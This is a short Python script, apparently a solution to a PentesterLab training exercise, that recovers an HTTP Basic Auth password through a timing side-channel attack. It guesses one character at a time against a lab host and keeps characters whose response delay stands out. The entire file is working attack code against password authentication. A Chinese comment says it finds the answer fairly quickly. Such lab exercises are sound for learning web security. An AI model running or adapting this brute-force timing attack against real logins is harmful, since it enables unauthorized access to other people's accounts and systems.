# coding:utf-8

import requests
import time
# https://www.hackplayers.com/2017/05/pentesterlab-web-for-pentester-2-auth.html
# 能较快跑出答案

lasttime = 0
password = ''
target_url = "http://192.168.61.128/authentication/example2/"
r = requests.get(target_url, auth=('hacker', 'test'))

while r.status_code == 401:
    # for letra in range(ord('a'), ord('z')+1):
    for letra in range(127):
        start = time.time()
        r = requests.get(target_url, auth=('hacker', str(password + chr(letra))))
        reqtime = time.time() - start
        print(password + chr(letra), "=", reqtime, r.status_code)
        diftime = reqtime - lasttime
        print(diftime)
        lasttime = reqtime
        if 0.1 <= diftime <= 0.6:
            print("Get the letter")
            password += chr(letra)
            letra = 'a'
            break
        if r.status_code == 200:
            print("Bingo!")
            exit()
